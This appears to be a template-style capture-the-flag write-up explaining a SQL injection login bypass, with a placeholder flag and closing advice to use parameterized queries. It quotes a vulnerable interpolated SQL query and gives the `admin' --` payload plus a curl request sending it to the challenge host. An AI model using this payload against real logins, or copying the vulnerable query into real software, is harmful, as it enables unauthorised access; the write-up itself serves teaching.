---
title: "Example: SQLi Login Bypass"
parent: Web Exploitation
nav_order: 1
---

# Example: SQLi Login Bypass
{: .no_toc }

| Field | Value |
|---|---|
| **CTF** | ExampleCTF 2026 |
| **Category** | Web Exploitation |
| **Points** | 100 |
| **Difficulty** | Easy |

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Challenge Description

> The challenge gave us a login page at `http://target.ctf:8080/login` and the source code for the backend (`app.py`). The goal was to log in as `admin` without knowing the password.

## Recon

Looking at the provided `app.py`, the login query was built like this:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

This is a classic unsanitized string interpolation — a textbook SQL injection vector.

## Exploitation

Since the query isn't parameterized, we can break out of the string and comment out the password check:

```
Username: admin' --
Password: anything
```

This turns the query into:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

Everything after `--` is treated as a comment, so the password check is bypassed entirely.

## Solution Steps

1. Navigate to the login page.
2. Enter `admin' --` as the username and any value as the password.
3. Submit the form.
4. Land on the admin dashboard, which reveals the flag.

```bash
curl -X POST http://target.ctf:8080/login \
  -d "username=admin' --&password=x"
```

## Flag

```
flag{this_is_a_placeholder_flag_replace_me}
```

## Lessons Learned

- Always use parameterized queries / prepared statements.
- Never trust client-supplied input in raw SQL strings.
